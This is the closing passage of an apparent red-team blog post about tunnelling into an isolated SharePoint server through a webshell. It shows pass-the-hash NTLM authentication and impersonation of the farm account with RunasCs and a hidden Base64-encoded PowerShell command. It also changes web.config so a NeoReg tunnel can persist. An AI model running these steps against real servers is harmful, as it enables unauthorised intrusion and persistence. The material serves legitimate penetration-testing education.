+<p>You can test it by putting the NTLM hash instead of the plaintext password in the authentication line.</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#f99157;">720</span><span style="color:#5fb3b3;">.     </span><span style="color:#cccece;">auth</span><span style="color:#5fb3b3;">=</span><span style="color:#6699cc;">HttpNtlmAuth</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">gmsp2016.dev</span><span style="color:#5fb3b3;">\\</span><span style="color:#99c794;">sp_services</span><span style="color:#5fb3b3;">&#39;,&#39;</span><span style="color:#99c794;">908E2A7188837309B262350F152C6028:BA03A114DEF8D5C913983436960E592C</span><span style="color:#5fb3b3;">&#39;)
+</span></pre>
+<p>This point is quite useful if you get NTLM hashes from SAM / LSASS dumps or the <a href="https://github.com/eladshamir/Internal-Monologue">Internal Monologue Attack</a>.</p>
+<h3 id="dealing-with-session-state">Dealing with Session State<a class="zola-anchor" href="#dealing-with-session-state" aria-label="Anchor link for: dealing-with-session-state">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h3>
+<p>Authentication was the first obstacle, but there is another remaining. ReGeorg/NeoReg needs a feature called <code>Session State</code> to store some persistent information across web requests such as socket handlers used to proxy internal connections. Session State is enabled in most IIS configurations, but it comes disabled by default in Sharepoint instances.</p>
+<p>One 'noob programmer' idea that came to my mind to fix this was to find a way of serializing the socket to pass this information to the Python client, then specifying the socket in each request so the server didn't have to remember this info. Unfortunately, sockets <strong>are not serializable</strong>. </p>
+<p>Knowing this information, the only option remaining was to enable session state. Probably, previous consent from the customer will be required here since we are going to change configuration parameters in a production environment. Sharepoint comes with <a href="https://docs.microsoft.com/en-us/powershell/module/sharepoint-server/get-spsessionstateservice?view=sharepoint-ps">its own Powershell cmdlets</a> to make this kind of operations easier.</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#6699cc;">Add-PsSnapin</span><span style="color:#cccece;"> Microsoft.SharePoint.PowerShell</span><span style="color:#5fb3b3;">; </span><span style="color:#6699cc;">Enable-SPSessionStateService </span><span style="color:#5fb3b3;">-</span><span style="color:#cccece;">DefaultProvision
+</span></pre>
+<p>I advance you that if you try to launch this command from Ysoserial payloads, the webshell or even SYSTEM with the Potato exploit, the server will deny your request with the following message:</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#cccece;">#&lt; CLIXML
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">Objs </span><span style="color:#bb80b3;">Version</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">1.1.0.1</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">xmlns</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">http://schemas.microsoft.com/powershell/2004/04</span><span style="color:#5fb3b3;">&quot;&gt;&lt;</span><span style="color:#eb606b;">S </span><span style="color:#bb80b3;">S</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">Error</span><span style="color:#5fb3b3;">&quot;&gt;</span><span style="color:#cccece;">Enable-SPSessionStateService : You need to have Farm administrator priviliges 
+</span></pre>
+<p>Fortunately, we have the <code>SP_Farm</code> account from the <code>appcmd.exe</code> command, so we can use it to solve privilege issues. To impersonate the farm user in a non-interactive environment, <a href="https://github.com/antonioCoco/RunasCs">RunAsCs</a> project can help us to create an <code>Interactive</code> process token (logon type 2) to launch the command without too much trouble. Note that the Powershell command has been encoded in Base64 to prevent issues with special chars and command line terminators.</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#cccece;">cmd </span><span style="color:#5fb3b3;">/</span><span style="color:#cccece;">c c:\programdata\</span><span style="color:#6699cc;">runascs.exe</span><span style="color:#cccece;"> SP_Farm pass</span><span style="color:#5fb3b3;">@</span><span style="color:#cccece;">word1 </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">powershell -window hidden -enc QQBkAGQALQBQAHMAUwBuAGEAcABpAG4AIABNAGkAYwByAG8AcwBvAGYAdAAuAFMAaABhAHIAZQBQAG8AaQBuAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsADsAIABFAG4AYQBiAGwAZQAtAFMAUABTAGUAcwBzAGkAbwBuAFMAdABhAHQAZQBTAGUAcgB2AGkAYwBlACAALQBEAGUAZgBhAHUAbAB0AFAAcgBvAHYAaQBzAGkAbwBuAA==</span><span style="color:#5fb3b3;">&quot; -</span><span style="color:#cccece;">d gmsp2016.dev </span><span style="color:#5fb3b3;">-</span><span style="color:#cccece;">l </span><span style="color:#f99157;">2
+</span></pre>
+<p>No output will be received from this command, but it could be modified to include STDOUT redirection in the Powershell command to write it into a file so it can be checked later. If everything went fine, Session State should be enabled now in the Sharepoint instance. </p>
+<p>There is one last thing to care about. As explained in the <a href="https://docs.microsoft.com/en-us/previous-versions/aspnet/ms178581(v=vs.100)?redirectedfrom=MSDN#session-variables">official Microsoft documentation</a>:</p>
+<p><em>&quot;When you use a session-state mode other than <a href="https://msdn.microsoft.com/en-us/library/cc99xk3f(v=vs.100)">InProc</a>, the session-variable type must be either a primitive .NET type or  serializable. This is because the session-variable value is stored in an external data store. For more information, see <a href="https://docs.microsoft.com/en-us/previous-versions/aspnet/ms178586(v=vs.100)">Session-State Modes</a>.&quot;</em></p>
+<p>Despite failing miserably when trying to serialize sockets, in the end I got valuable information. NeoReg will fail again if we try to use it right now, but we know why: Session State is enabled with the <code>external data store</code> mode by default, which cannot handle socket serialization, so we must change it for the <code>InProc</code> mode. We can achieve this by adding the <code>&lt;sessionState&gt;</code> config in the <code>web.config</code> file corresponding to the Sharepoint app we are using:</p>
+<pre style="background-color:#2b2c2f;">
+<span style="color:#5fb3b3;">&lt;?</span><span style="color:#eb606b;">xml </span><span style="color:#bb80b3;">version</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">1.0</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">encoding</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">UTF-8</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">standalone</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">yes</span><span style="color:#5fb3b3;">&quot;?&gt;
+&lt;</span><span style="color:#eb606b;">configuration</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#cccece;">
+...
+  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">system.web</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#cccece;">
+  ...
+	</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">sessionState </span><span style="color:#bb80b3;">mode</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">InProc</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">timeout</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">25</span><span style="color:#5fb3b3;">&quot;&gt;&lt;/</span><span style="color:#eb606b;">sessionState</span><span style="color:#5fb3b3;">&gt; 
+</span></pre>
+<p>Normally, Sharepoint servers will handle <code>web.config</code> modifications automatically, so there is no need to restart any service. After that, NeoReg should finally work, allowing us to configure a proxy tunnel even in the most lone Sharepoint. It's up to my dear reader which steps are taken from now on.</p>
+<p>Be gentle. </p>
+<p>@acap4z</p>
+<h2 id="conclusion">Conclusion<a class="zola-anchor" href="#conclusion" aria-label="Anchor link for: conclusion">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<p>In this post we have demonstrated that Sharepoint instances are attractive assets for atackers when exposed, even in those cases where only the HTTP or HTTPS port is reachable and credentials are required. If this software is not properly patched, critical vulnerabilities can be handful for malicious actors to get control of the affected servers. Even though the vulnerabilities mentioned here are somewhat outdated right now, there are high chances of finding instances that are not fully patched. Moreover, new CVEs will be potentially disclosed in the future such as <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1707">CVE-2021-1707</a>, so the gates will be continuously opened for this exploitation path.</p>
+<p>C2 tools like Cobalt Strike are very suitable in those cases where HTTP outbound connections are possible. It provides not only command execution, but also a lot of tools that can be launched in-memory without privilege escalation, such as reverse proxies to get a tunnel to the internal network.</p>
+<p>If we find the Lone Sharepoint which has no outbound connectivity, it is still possible to set up persistences in the form of web-based applications. With a bit of extra effort, we have demonstrated that even Web Tunneling is possible in tough cases.</p>
+<h2 id="aknowledgements">Aknowledgements<a class="zola-anchor" href="#aknowledgements" aria-label="Anchor link for: aknowledgements">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<ul>
+<li>All the people that have shared their research and efforts in this field, whose work is referenced in this post.</li>
+<li>All the Crummie5 for their support and post reviewal.</li>
+</ul>
+<h2 id="disclaimer">Disclaimer<a class="zola-anchor" href="#disclaimer" aria-label="Anchor link for: disclaimer">
+    <svg id="i-link" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32" fill="none"
+        stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+        <path
+            d="M18 8 C18 8 24 2 27 5 30 8 29 12 24 16 19 20 16 21 14 17 M14 24 C14 24 8 30 5 27 2 24 3 20 8 16 13 12 16 11 18 15">
+        </path>
+    </svg>
+</a>
+</h2>
+<p>The contents explained in this article are oriented to academic purposes and must not be used without customer's permission, or followed literally in real life security projects. It's up to the reader to investigate how to adapt these cases to their particular needs.</p>
+
+    </div>
+</div>
+
+
+</body>
+
+</html>
